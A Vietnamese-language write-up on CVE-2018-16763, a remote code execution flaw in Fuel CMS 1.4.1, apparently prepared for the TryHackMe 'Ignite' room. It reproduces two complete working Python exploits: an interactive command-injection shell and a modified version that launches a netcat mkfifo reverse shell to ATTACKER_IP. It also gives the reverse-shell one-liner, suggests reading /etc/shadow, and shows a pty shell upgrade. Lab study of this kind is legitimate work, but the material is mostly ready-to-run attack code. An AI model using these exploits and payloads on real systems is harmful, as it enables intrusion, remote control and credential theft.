# __CVE-2018-16763__

https://www.exploit-db.com/search?cve=2018-16763

---

## __Tổng quan__

CVE này nói về lỗ hỏng của Fuel CMS version 1.4.1 về việc ta có thể chèn và thực thi mã từ xa thông qua parameter của `../pages/select/?filter` có trong phiên bản. Thông qua Exploit-DB hoặc searchsploit trên máy kali, ta sẽ có được 2 file khai thác lỗ hổng là 47138.py và 50477.py 

File 50477.py mô tả trực quan hơn từ việc RCE, 

```python title="50477.py" linenums="1"
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
        cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

        main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

        r = requests.get(main_url)

        #<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

        output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
        print(output[0])
        if cmd == "exit":
                break
```

Ta thấy source code trên mô tả việc lấy 1 giá trị lệnh từ attacker (biến cmd ở dòng 52) và truyền vào đoạn url để attack, công đoạn tiếp theo là đoạn output dữ liệu từ hệ thống. Vậy từ flow này thì ta sẽ làm gì tiếp theo?

Nếu ta có thể xem được file /etc/shadow thì câu chuyện có thể kết thúc tại đây. Nhưng nếu không xem được thì sao?

Một ý tưởng mới ta có thể tạo reverse shell bằng Netcat OpenBsd và sau đó dùng `python -c import pty;pty.spawn ("/bin/bash")` (nếu có thể) để vào terminal của máy nạn nhân.

*[Netcat OpenBsd]: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f 

Roài, dựa vào ý tưởng trên, ta sẽ cải tiến đoạn code khai thác trên thành

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated
# Date 2021-08-16
# Exploit Author: jtaubs1 (ice-wzl)
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

# Update included: Works with python3
    # Removed burp proxy code to allow it to run as a stand alone RCE exploit. 
    # Takes sys.args
    # Spawns a Reverse shell

#!/usr/bin/python3
import requests
import urllib.parse
import sys


url_victim_machine = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " 
command += attacker_ip 
command += " "
command += attacker_port
command += ">/tmp/f"

payload = url_victim_machine + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(command)+"%27%29%2b%27"
r = requests.get(payload)
print(r)
```

Đoạn code trên có ưu điểm là nó sẽ thực hiện luôn công việc tạo 1 revershell từ máy nạn nhân đến máy chúng ta thông qua lỗ hổng.

## __Challenge__

<div class="grid" markdown>

[__TryHackMe | Ignite__](https://tryhackme.com/room/ignite)
{ .card }
> [__Writeup__](/tryhackme/room/ignite)


</div>